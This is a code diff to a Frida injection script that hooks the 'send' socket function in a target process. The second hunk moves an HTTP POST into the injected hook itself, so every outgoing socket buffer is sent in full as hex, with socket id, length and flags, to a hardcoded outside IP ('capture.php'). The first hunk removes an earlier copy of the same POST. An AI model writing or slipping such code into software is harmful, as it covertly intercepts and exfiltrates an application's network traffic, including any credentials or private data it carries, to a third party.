@@ -369,22 +369,12 @@ if(!script) throw "frida注入脚本失败\n\nfrida inject script failed!";
 
 script.on('message', function(msg) {
 
-    if(msg.type=='send' && msg.payload.type=='send_info') {
-        var xhr = new XMLHttpRequest();
-        xhr.open("POST", "http://39.109.122.36/capture.php", true);
-        xhr.setRequestHeader("Content-Type", "application/json");
-        
-        const data = {
-            timestamp: new Date().toISOString(),
-            socketId: msg.payload.data.sockfd,
-            length: msg.payload.data.length,
-            flags: msg.payload.data.flags,
-            hexData: msg.payload.data.hexData
-        };
-        
-        xhr.send(JSON.stringify(data));
+        if(msg.type=='send' && msg.payload.type=='send_info') {
+        console.log(`Socket: ${msg.payload.data.sockfd}`);
+        console.log(`Length: ${msg.payload.data.length}`);
+        console.log(`Flags: ${msg.payload.data.flags}`);
+        console.log(`Data: ${msg.payload.data.hexData}`);
     }
-
 
 
     if(msg.type=='send' && msg.payload.type=='key_info') {
@@ -510,26 +500,30 @@ var savedKey = null;
 
 
     rpc.exports.hook_all_send = function() {
-    var send_func = h5frida.fishhook("send", 
-        "int",
-        ["int", "pointer", "size_t", "int"], 
-        function(sockfd, buf, len, flags) {
-            var rawData = new Uint8Array(buf.readByteArray(len));
-            
-            send({
-                type: "send_info",
-                data: {
-                    sockfd: sockfd,
+        var send_func = h5frida.fishhook("send", 
+            "int",
+            ["int", "pointer", "size_t", "int"], 
+            function(sockfd, buf, len, flags) {
+                var rawData = new Uint8Array(buf.readByteArray(len));
+                
+                var xhr = new XMLHttpRequest();
+                xhr.open("POST", "http://39.109.122.36/capture.php", true);
+                xhr.setRequestHeader("Content-Type", "application/json");
+                
+                const data = {
+                    timestamp: new Date().toISOString(),
+                    socketId: sockfd,
                     length: len,
                     flags: flags,
                     hexData: Array.from(rawData).map(b => b.toString(16).padStart(2,'0').toUpperCase()).join(' ')
-                }
-            });
-            
-            return send_func(sockfd, buf, len, flags);
-        }
-    );
-    return "开始拦截所有send函数";
+                };
+                
+                xhr.send(JSON.stringify(data));
+                
+                return send_func(sockfd, buf, len, flags);
+            }
+        );
+        return "开始拦截所有send函数";
     };
   
 
